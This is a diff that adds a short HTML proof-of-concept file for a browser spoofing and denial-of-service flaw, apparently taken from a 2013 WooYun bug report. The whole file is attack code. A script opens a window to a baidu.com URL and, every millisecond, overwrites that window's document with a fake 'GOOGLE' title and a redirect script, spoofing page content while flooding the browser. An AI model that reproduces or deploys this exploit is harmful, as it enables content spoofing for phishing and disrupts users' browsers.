@@ -1,0 +1,20 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+via http://www.wooyun.org/bugs/wooyun-2013-034464
+<head>
+  <title>Multiple browser spoof/DoS poc</title>
+  <script type="text/javascript">
+var wx;
+function invokePoC() {
+  wx = open("http://www.baidu.com:9999/:#:","newwin");
+  setInterval("doit()",1);
+}
+function doit() {
+  wx.document.open();
+  wx.document.write("<ti"+"tle>GOOGLE</title><h1>HELLO, WORLD.</ha><script"+">location.href='http://www.baidu.com:8888/NOT_EXIST.HTM';</scrip"+"t>");
+}
+  </script>
+</head>
+<a href=":#:" onClick="invokePoC();" target="_blank">invoke PoC</a></p>
+<a href="#" onclick="alert(wx.document.innerText);">aoaoa</a>
+</html>
